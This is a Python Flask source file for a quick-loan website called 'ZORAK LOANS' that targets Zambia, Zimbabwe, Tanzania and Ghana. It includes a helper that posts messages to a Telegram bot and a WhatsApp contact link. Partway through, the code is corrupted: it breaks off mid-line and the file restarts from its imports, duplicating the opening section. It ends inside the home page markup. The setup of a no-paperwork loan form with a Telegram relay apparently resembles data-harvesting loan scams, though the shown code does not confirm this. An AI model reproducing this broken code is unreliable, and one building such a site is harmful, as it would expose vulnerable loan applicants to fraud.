from flask import Flask, request
import csv, os, requests
from datetime import datetime
app = Flask(__name__)
NL = chr(10)
WA = 'https://wa.me/message/'
WA = WA + 'CFCJWLOZ7IWZK1'
BOT = os.environ.get('BOT_TOKEN')
CHAT = os.environ.get('CHAT_ID')
def send_t(t):
    if not BOT:
        return False
    if not CHAT:
        return False
    try:
        u = 'https://api.telegram.org/bot'
        u = u + BOT + '/sendMessage'
        d = {'chat_id': CHAT, 'text': t}
        r = requests.post(u, json=d, timeout=10)
        return r.status_code == 200
    except:
        return False
def style():
    s = ''
    s = s + '<style>'
    s = s + 'body{margin:0;font-family:Arial;'
    s = s + 'background:#f2f7f2;color:#111}'
    s = s + '.top{background:#0a5c36;color:#fff;'
    s = s + 'padding:18px;text-align:center}'
    s = s + '.top b{font-size:24px}'
    s = s + '.top span{color:#ffc107}'
    s = s + '.wrap{max-width:520px;margin:16px auto;'
    s = s + 'padding:0 14px}'
    s = s + '.card{background:#fff;'
    s = s + 'border-radius:16px;padding:20px;'
    s = s + 'box-shadow:0 4px 20px #0001}'
    s = s + 'h1{margin:0 0 6px;font-size:26px}'
    s = s + 'p{margin:10px 0}'
    s = s + 'input,select{width:100%;padding flask import Flask, request
import csv, os, requests
from datetime import datetime
app = Flask(__name__)
NL = chr(10)
WA = 'https://wa.me/message/'
WA = WA + 'CFCJWLOZ7IWZK1'
BOT = os.environ.get('BOT_TOKEN')
CHAT = os.environ.get('CHAT_ID')
def send_t(t):
    if not BOT:
        return False
    if not CHAT:
        return False
    try:
        u = 'https://api.telegram.org/bot'
        u = u + BOT + '/sendMessage'
        d = {'chat_id': CHAT, 'text': t}
        r = requests.post(u, json=d, timeout=10)
        return r.status_code == 200
    except:
        return False
def style():
    s = ''
    s = s + '<style>'
    s = s + 'body{margin:0;font-family:Arial;'
    s = s + 'background:#f2f7f2;color:#111}'
    s = s + '.top{background:#0a5c36;color:#fff;'
    s = s + 'padding:18px;text-align:center}'
    s = s + '.top b{font-size:24px}'
    s = s + '.top span{color:#ffc107}'
    s = s + '.wrap{max-width:520px;margin:16px auto;'
    s = s + 'padding:0 14px}'
    s = s + '.card{background:#fff;'
    s = s + 'border-radius:16px;padding:20px;'
    s = s + 'box-shadow:0 4px 20px #0001}'
    s = s + 'h1{margin:0 0 6px;font-size:26px}'
    s = s + 'p{margin:10px 0}'
    s = s + 'input,select{width:100%;padding:12px;'
    s = s + 'border:1px solid #ddd;'
    s = s + 'border-radius:10px;'
    s = s + 'box-sizing:border-box;font-size:16px}'
    s = s + '.btn{display:block;text-align:center;'
    s = s + 'background:#0a5c36;color:#fff;'
    s = s + 'padding:14px;border-radius:12px;'
    s = s + 'text-decoration:none;font-weight:bold;'
    s = s + 'border:0;width:100%;font-size:17px;'
    s = s + 'cursor:pointer}'
    s = s + '.btn2{background:#ffc107;color:#111}'
    s = s + '.row{display:flex;gap:10px}'
    s = s + '.row div{flex:1}'
    s = s + '.pill{display:inline-block;'
    s = s + 'background:#e8f5ee;padding:6px 10px;'
    s = s + 'border-radius:20px;font-size:13px;'
    s = s + 'margin:2px}'
    s = s + '.big{font-size:28px;font-weight:bold;'
    s = s + 'color:#0a5c36}'
    s = s + '.muted{color:#666;font-size:14px}'
    s = s + '</style>'
    return s
def top():
    t = ''
    t = t + '<div class=top>'
    t = t + '<b>ZORAK <span>LOANS</span></b>'
    t = t + '<div>Fast Loans - Zambia | Zimbabwe'
    t = t + ' | Tanzania | Ghana</div>'
    t = t + '</div>'
    return t
@app.route('/')
@app.route('/api')
def home():
    t = ''
    t = t + style()
    t = t + top()
    t = t + '<div class=wrap>'
    t = t + '<div class=card>'
    t = t + '<h1>Need cash today?</h1>'
    t = t + '<p class=muted>Apply in 2 mins.'
    t = t + ' Get answer on WhatsApp.</p>'
    t = t + '<span class=pill>No paperwork</span>'
    t = t + '<span class=pill>Same day</span>'
    t = t + '<span class=pill>Safe</span>'
    t = t + '<p>Country</p>'
    t = t + '<select id=c>'
    t = t + '<option>Zambia</option>'
    t = t + '<option>Zimbabwe</option>'
    t = t + '<option>Tanzania</option>'
    t = t + '<option>Ghana</option>'
    t = t + '</select>'
    t = t + '<div class=row>'
    t = t + '<div>'
    t = t + '<p>Amount</p>'
    t = t + '<input id=a value=5000>'
    t = t + '</div>'
    t = t + '<div>'
    t = t + '<p>Term (months)</p>'
    t = t + '<input id=n value=12>'
    t = t + '</div>'
    t = t + '</div>'
    t = t + '<p>Your Monthly Payment</p>'
    t = t + '<div class=big id=m></div>'
    t = t + '<p class=muted>8% interest.'
    t = t + ' Example only.</p>'
    t = t + '<button class=btn onclick=calc()>'
    t = t + 'Calculate</button>'
    t = t + '<br>'
    t = t + '<a class="btn btn2" href=/apply-form>'
    t = t + 'APPLY NOW</a>'
    t = t + '<br>'
    t = t + '<a class=btn href=' + WA + '>'
    t = t + 'Chat on WhatsApp</a>'
    t = t + '</div>'
    t = t + '<br>'
    t = t + '<div class=card>'
    t = t + '<h3>How it works</h3>'
    t = t + '<p>1. Fill form - 2 mins</p>'
